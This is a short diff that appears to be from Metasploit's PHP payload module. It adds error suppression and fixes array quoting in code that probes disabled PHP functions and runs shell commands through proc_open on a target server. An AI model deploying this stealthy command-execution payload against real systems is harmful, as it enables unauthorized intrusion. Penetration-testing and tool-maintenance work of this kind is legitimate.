@@ -26,6 +26,7 @@ module Msf::Payload::Php
     # Canonicalize the list of disabled functions to facilitate choosing a
     # system-like function later.
     preamble = "/*<?php /**/
+      @error_reporting(0);
       @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);
       #{dis}=@ini_get('disable_functions');
       if(!empty(#{dis})){
@@ -102,7 +103,7 @@ module Msf::Payload::Php
       }else"
     proc_open = "
       if(#{is_callable}('proc_open')and!#{in_array}('proc_open',#{dis})){
-        $handle=proc_open(#{cmd},array(array(pipe,'r'),array(pipe,'w'),array(pipe,'w')),$pipes);
+        $handle=proc_open(#{cmd},array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);
         #{output}=NULL;
         while(!feof($pipes[1])){
           #{output}.=fread($pipes[1],1024);
